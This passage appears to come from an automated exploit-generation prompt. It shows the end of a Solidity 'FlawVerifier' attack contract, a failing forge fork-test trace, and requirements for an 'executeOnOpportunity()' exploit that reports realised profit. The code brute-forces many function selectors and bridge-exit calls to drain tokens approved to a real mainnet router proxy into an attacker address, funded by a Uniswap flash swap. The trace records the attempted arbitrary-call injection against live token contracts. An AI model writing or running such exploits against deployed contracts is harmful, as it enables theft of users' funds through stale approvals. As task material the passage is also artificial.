        uint160 amount160 = amount > type(uint160).max ? type(uint160).max : uint160(amount);

        payloads[0] = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("pullToken(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[3] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256,address)")),
            proxy,
            attacker,
            amount,
            token
        );
        payloads[4] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint160,address)")),
            proxy,
            attacker,
            amount160,
            token
        );
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), token, tokenPull);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), token, tokenPull);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("call(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[9] = abi.encodeWithSelector(bytes4(keccak256("run(address,bytes)")), token, tokenPull);
        payloads[10] = abi.encodeWithSelector(bytes4(keccak256("run(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[11] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), token, tokenPull);
        payloads[12] = abi.encodeWithSelector(bytes4(keccak256("exec(address,uint256,bytes)")), token, 0, tokenPull);
        payloads[13] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), token, tokenPull);
        payloads[14] = abi.encodeWithSelector(bytes4(keccak256("executeCall(address,bytes)")), token, tokenPull);
        payloads[15] = abi.encodeWithSelector(bytes4(keccak256("executeTarget(address,bytes)")), token, tokenPull);
        payloads[16] = abi.encodeWithSelector(bytes4(keccak256("swap(address,bytes)")), token, tokenPull);
        payloads[17] = abi.encodeWithSelector(bytes4(keccak256("bridge(address,bytes)")), token, tokenPull);
    }

    function _gatewayExitPayloads(
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal pure returns (bytes[9] memory payloads) {
        payloads[0] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(10),
            bytes("")
        );
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(137),
            bytes("")
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(42161),
            bytes("")
        );
        payloads[3] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(56),
            bytes("")
        );
        payloads[4] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(43114),
            bytes("")
        );
        payloads[5] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(250),
            bytes("")
        );
        payloads[6] = abi.encodeWithSelector(
            bytes4(keccak256("outboundTransferTo(uint256,address,address,address,uint256,bytes)")),
            amount,
            proxy,
            attacker,
            token,
            uint256(1),
            bytes("")
        );
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("claimTokens(address,address,uint256)")), token, proxy, amount);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("withdrawToken(address,address,address,uint256)")), token, proxy, attacker, amount);
    }

    function _routerForwardPayloads(
        address target,
        bytes memory innerCall
    ) internal pure returns (bytes[16] memory payloads) {
        payloads[0] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), target, innerCall);
        payloads[1] = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)")), target, 0, innerCall);
        payloads[2] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), target, innerCall);
        payloads[3] = abi.encodeWithSelector(bytes4(keccak256("call(address,uint256,bytes)")), target, 0, innerCall);
        payloads[4] = abi.encodeWithSelector(bytes4(keccak256("run(address,bytes)")), target, innerCall);
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("run(address,uint256,bytes)")), target, 0, innerCall);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), target, innerCall);
        payloads[7] = abi.encodeWithSelector(bytes4(keccak256("exec(address,uint256,bytes)")), target, 0, innerCall);
        payloads[8] = abi.encodeWithSelector(bytes4(keccak256("executeTarget(address,bytes)")), target, innerCall);
        payloads[9] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), target, innerCall);
        payloads[10] = abi.encodeWithSelector(bytes4(keccak256("executeCall(address,bytes)")), target, innerCall);
        payloads[11] = abi.encodeWithSelector(bytes4(keccak256("swap(address,bytes)")), target, innerCall);
        payloads[12] = abi.encodeWithSelector(bytes4(keccak256("bridge(address,bytes)")), target, innerCall);
        payloads[13] = abi.encodeWithSelector(bytes4(keccak256("invoke(address,bytes)")), target, innerCall);
        payloads[14] = abi.encodeWithSelector(bytes4(keccak256("dispatch(address,bytes)")), target, innerCall);
        payloads[15] = abi.encodeWithSelector(bytes4(keccak256("forward(address,bytes)")), target, innerCall);
    }

    function _observeApprovalState(
        address token,
        address spender,
        address[] memory currentRouters
    ) internal returns (uint256 approval) {
        approval = _allowance(token, TARGET, spender);
        if (approval == 0) {
            return 0;
        }

        _staleApprovalObserved = true;
        _markPath(0);
        _markPath(1);

        if (!_contains(currentRouters, currentRouters.length, spender)) {
            _markPath(3);
        }
    }

    function _markPath(uint256 index) internal {
        if (index < 256) {
            _coveredPaths |= (uint256(1) << index);
        }
    }

    function _isPathCovered(uint256 index) internal view returns (bool) {
        return ((_coveredPaths >> index) & 1) == 1;
    }

    function _bestObservedNarrative() internal view returns (string memory) {
        if (_isPathCovered(0) && _isPathCovered(1) && _isPathCovered(2) && _isPathCovered(3)) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        }
        if (_isPathCovered(0) && _isPathCovered(1) && _isPathCovered(2)) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2);
        }
        if (_isPathCovered(0) && _isPathCovered(1)) {
            return string.concat(PATH_0, " ", PATH_1);
        }
        if (_isPathCovered(0)) {
            return PATH_0;
        }
        return _path;
    }

    function _contains(address[] memory list, uint256 length, address candidate) internal pure returns (bool) {
        for (uint256 i = 0; i < length; i++) {
            if (list[i] == candidate) {
                return true;
            }
        }
        return false;
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _readUint(address target, bytes4 selector) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _callSucceeded(bool ok, bytes memory ret) internal pure returns (bool) {
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _defaultSeedAmount(address token) internal pure returns (uint256) {
        if (token == USDC) return 1_000_000;
        if (token == USDT) return 1_000_000;
        if (token == DAI) return 1e18;
        if (token == WETH) return 1e17;
        if (token == WBTC) return 10_000;
        if (token == 0x853d955aCEf822Db058eb8505911ED77F175b99e) return 1e18;
        return 1e18;
    }
}

```

forge stdout (tail):
```
, 0x23Ddd3e3692d1861Ed57EDE224608875809e127f, 0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52, 0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1, 0xaBA2c5F108F7E820C049D5Af70B16ac266c8f128, 0x10E6593CDda8c58a1d0f14C5164B376352a55f2F, 0xC5b1EC605738eF73a4EFc562274c1c0b6609cF59, 0x5427FEFA711Eff984124bFBB1AB6fbf5E3DA1820, 0x3666f603Cc164936C1b87e207F36BEBa4AC5f18a, 0x3E4a3a4796d16c0Cd582C382691998f7c06420B6, 0x22B1Cbb8D98a01a3B71D034BB899775A76Eb1cc2, 0x3d4Cc8A61c7528Fd86C55cfe061a78dCBA48EDd1, 0xb8901acB165ed027E32754E0FFe830802919727f, 0xb98454270065A31D71Bf635F6F7Ee6A518dFb849, 0x92e929d8B2c8430BcAF4cD87654789578BB2b786]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [33994] 0x3335A88bb18fD3b6824b59Af62b50CE494143333::routerCall{value: 586000000000000}(BaseCrossChainParams({ srcInputToken: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, srcInputAmount: 100000000000000000 [1e17], dstChainID: 1, dstOutputToken: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, dstMinOutputAmount: 0, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, integrator: 0x0000000000000000000000000000000000000000, router: 0xB9E13785127BFfCc3dc970A55F6c7bF0844a3C15 }), 0x03B7551EB0162c838a10c2437b60D1f5455b9554, 0x1cff79cd00000000000000000000000003b7551eb0162c838a10c2437b60d1f5455b95540000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000003335a88bb18fd3b6824b59af62b50ce4941433330000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000016345785d8a000000000000000000000000000000000000000000000000000000000000)
    │   │   │   │   ├─ [19866] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x3335A88bb18fD3b6824b59Af62b50CE494143333, 100000000000000000 [1e17])
    │   │   │   │   │   └─ ← [OutOfGas] EvmError: OutOfGas
    │   │   │   │   └─ ← [OutOfGas] EvmError: OutOfGas
    │   │   │   └─ ← [OutOfGas] EvmError: OutOfGas
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1615] 0x4Fabb145d64652a948d72533023f6E7A623C7C53::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [836] 0x5864c777697Bf9881220328BF2f16908c9aFCD7e::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1207] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [508] 0xd8D59c59Ab40B880b54C969920E8d9172182Ad7b::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [678] 0x956F47F50A910163D8BF957Cf5846D573E7f87CA::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [631] 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [487] 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [813] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [OutOfGas] EvmError: OutOfGas
    │   └─ ← [OutOfGas] EvmError: OutOfGas
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x256415A1f9468E5405abdAfD9B76c4f24451d7E7
  at 0x2A5c2568b10A0E826BfA892Cf21BA7218310180b
  at 0x3335A88bb18fD3b6824b59Af62b50CE494143333.routerCall
  at FlawVerifier.uniswapV2Call
  at 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 19.04s (18.80s CPU time)

Ran 1 test suite in 20.29s (19.04s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 1056944164)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
